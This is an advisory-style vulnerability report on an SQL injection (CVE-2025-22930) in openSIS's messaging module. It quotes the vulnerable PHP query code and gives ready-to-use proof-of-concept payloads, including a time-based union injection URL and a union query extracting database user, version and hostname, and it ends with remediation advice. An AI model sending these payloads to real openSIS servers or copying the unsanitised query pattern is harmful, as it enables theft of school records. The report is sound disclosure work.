# CVE-2025-22930 Vulnerability Report

## Overview

- **CVE ID**: CVE-2025-22930
- **CWE**: CWE-89 (SQL Injection)
- **Affected Software**: OS4ED openSIS v7.0 to v9.1
- **Severity**: Critical (CVSS 3.1: 9.8)

## Vulnerability Details

### Location
- **File**: `/modules/messaging/Group.php`
- **Parameter**: `groupid` / `group_id`

### Vulnerable Code

The `Group.php` file contains multiple SQL queries that directly use the `$_REQUEST['group_id']` parameter without proper sanitization:

```php
// Line 52
$member = "select * from mail_groupmembers where GROUP_ID='" . $_REQUEST['group_id'] . "'";

// Line 77
$group = "select GROUP_NAME,DESCRIPTION from mail_group where GROUP_ID=$_REQUEST[group_id]";

// Line 72-73 (delete function)
$members = DBGet(DBQuery("select count(*) as countmember from mail_groupmembers where group_id=" . $group_id . ""));
```

### Attack Vectors (Official PoC)

From: https://github.com/esusalla/vulnerability-research/tree/main/CVE-2025-22930

1. **Union-based SQL Injection (Time-based)**
   - Payload: `0+union+select+sleep(10),null,null,null,null,null,null`
   - URL: `/Modules.php?modname=messaging/Group.php&modfunc=members&groupid=0+union+select+sleep(10),null,null,null,null,null,null`

2. **Union-based SQL Injection (Data Extraction)**
   - Payload: `0+union+select+user(),version(),database(),@@hostname,null,null,null`

Any authenticated user (admin, teacher, student) can exploit this vulnerability.

## Impact

An authenticated attacker can:
- Extract sensitive data from the database
- Modify or delete database records
- Potentially gain administrative access
- Execute arbitrary SQL commands

## Remediation

1. Use parameterized queries (prepared statements)
2. Implement input validation and sanitization
3. Apply principle of least privilege to database accounts
4. Update to the latest patched version of openSIS

## References

- [NVD - CVE-2025-22930](https://nvd.nist.gov/vuln/detail/CVE-2025-22930)
- [openSIS GitHub Repository](https://github.com/OS4ED/openSIS-Classic)
- [Official PoC](https://github.com/esusalla/vulnerability-research/tree/main/CVE-2025-22930)
